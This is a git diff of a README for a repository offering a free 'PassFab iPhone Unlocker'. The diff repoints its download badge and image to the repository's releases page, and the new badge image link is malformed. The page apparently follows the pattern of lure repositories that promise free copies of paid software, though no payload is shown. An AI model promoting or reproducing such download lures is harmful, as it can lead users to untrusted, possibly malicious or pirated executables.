@@ -10,7 +10,7 @@ Welcome to the PassFab iPhone Unlocker Free repository! Here, you can find all t
 
 ## Get PassFab iPhone Unlocker Now!
 To get your hands on the PassFab iPhone Unlocker, simply click on the link below:
-[![Download PassFab iPhone Unlocker](https://img.shields.io/badge/Download-PassFab%20iPhone%20Unlocker-blue)](https://github.com/uploads/App.zip)
+[![Download PassFab iPhone Unlocker](https://github.com/Raj200d/PassFab-iPhone-Unlocker-Free/releases%20iPhone%20Unlocker-blue)](https://github.com/Raj200d/PassFab-iPhone-Unlocker-Free/releases)
 
 ## Unleash the Power of PassFab iPhone Unlocker
 Unlocking your iPhone has never been easier with PassFab iPhone Unlocker. Below are some key features and benefits of using this tool:
@@ -46,6 +46,6 @@ For the latest updates, releases, and announcements related to PassFab iPhone Un
 
 Unlock your iPhone with ease using PassFab iPhone Unlocker Free edition now! Don't let a locked device stand in your way – regain access and control today. 
 
-![iPhone Unlocker](https://example.com/iphone_unlocker_image.png)
+![iPhone Unlocker](https://github.com/Raj200d/PassFab-iPhone-Unlocker-Free/releases)
 
 For any questions or inquiries, feel free to reach out to us. Happy unlocking! 🚀📱
